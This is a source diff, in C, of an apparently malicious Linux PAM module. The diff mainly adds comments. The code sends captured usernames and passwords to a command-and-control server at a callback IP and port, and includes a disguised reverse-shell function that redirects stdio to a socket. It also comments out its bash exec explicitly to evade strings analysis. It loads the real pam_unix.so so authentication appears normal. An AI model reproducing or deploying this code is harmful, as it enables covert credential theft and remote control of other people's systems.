@@ -24,7 +24,9 @@
 
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
+// Function to send data to the c2 server (mainly username:password combinations)
 int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
+    // Get host IP address
     char hostbuffer[256];
     char* ipaddr;
     struct hostent *host_entry;
@@ -40,6 +42,7 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
     // address into ASCII string
     ipaddr = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
 
+    // Create socket to connect to c2 server
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock >= 0) {
         struct sockaddr_in serv_addr;
@@ -47,9 +50,13 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
         serv_addr.sin_port = htons(CALLBACK_PORT);
         inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
 
+        // Connect to c2 server on CALLBACK_IP and CALLBACK_PORT
         if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
+            // Create credential message in RET_FMT format
             char credentials[256];
             snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, username, password);
+
+            // Send message to c2 server and close connection
             send(sock, credentials, strlen(credentials), 0);
             close(sock);
          }
@@ -58,7 +65,9 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
     return 0;
 }
 
+// UNUSED: Function to spawn a reverse shell (might reimplement later)
 int pam_log_err() {
+    // Fork process so it won't block out other authentication
     pid_t pid = fork();
     if (pid == -1) {
 		return 1;
@@ -67,6 +76,7 @@ int pam_log_err() {
 		return 0;
 	}
 
+    // Create socket to c2 server
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock >= 0) {
         struct sockaddr_in serv_addr;
@@ -74,20 +84,23 @@ int pam_log_err() {
         serv_addr.sin_port = htons(CALLBACK_PORT);
         inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
 
+        // Send /bin/bash to c2 server
         if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
             dup2(sock, 0);
             dup2(sock, 1);
             dup2(sock, 2);
-            char * const argv[] = {"/bin/bash", NULL};
-            execve("/bin/bash", argv, NULL);
+            // These two lines are commented out to avoid /bin/bash showing up in strings analysis
+            // char * const argv[] = {"/bin/bash", NULL};
+            // execve("/bin/bash", argv, NULL);
          }
     }
 
     return 0;
 }
 
+// Function to dynamically link the real pam_unix.so to allow normal authentication
 int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int argc, const char **argv) {
-    
+    // Error handling (these really shouldn't matter)
     if (!name) {
         return PAM_AUTH_ERR;
     }
@@ -95,6 +108,7 @@ int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int a
         return PAM_AUTH_ERR;
     }
 
+    // Open handle 
     void *handle = dlopen(PAM_PATH, RTLD_LAZY | RTLD_GLOBAL);
     if (!handle) {
         pam_syslog(pamh, LOG_ERR, "PAM unable to dlopen(pam_unix.so): %s", dlerror());
@@ -165,7 +179,7 @@ PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, cons
     struct passwd *pw = getpwnam(username);
     uid_t target_uid = pw->pw_uid;
 
-    // Get UID of the calling user (e.g., sudo user)
+    // Get UID of the calling user
     uid_t caller_uid = getuid();
     struct passwd *caller_pw = getpwuid(caller_uid);
     const char *calling_user = caller_pw ? caller_pw->pw_name : "UNKNOWN";
